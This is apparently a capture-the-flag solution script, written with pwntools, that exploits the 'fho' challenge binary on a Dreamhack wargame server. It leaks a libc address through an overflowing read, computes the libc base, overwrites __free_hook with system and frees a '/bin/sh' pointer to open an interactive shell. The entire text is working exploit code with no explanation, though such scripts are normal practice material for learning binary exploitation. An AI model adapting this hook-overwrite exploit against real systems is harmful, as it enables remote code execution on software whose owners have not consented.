from pwn import *
p=remote("host1.dreamhack.games",22216)
e=ELF("./fho")
libc=ELF("./libc-2.27.so")
freehook_offset=libc.symbols["__free_hook"]
system_offset=libc.symbols["system"]
binsh_offset=list(libc.search(b"/bin/sh"))[0]
libcstartmain_offset=libc.symbols["__libc_start_main"]

buf=b'A'*0x48
p.sendafter("Buf: ",buf)
p.recvuntil(buf)
libcmain=u64(p.recvn(6)+b"\x00"*2)
libc=libcmain-(libcstartmain_offset+231)
system=libc+system_offset
freehook=libc+freehook_offset
binsh=libc+binsh_offset
p.recvuntil("write: ")
p.sendline(str(freehook).encode())
p.recvuntil("With: ")
p.sendline(str(system).encode())
p.recvuntil("To free: ")
p.sendline(str(binsh).encode())
p.interactive()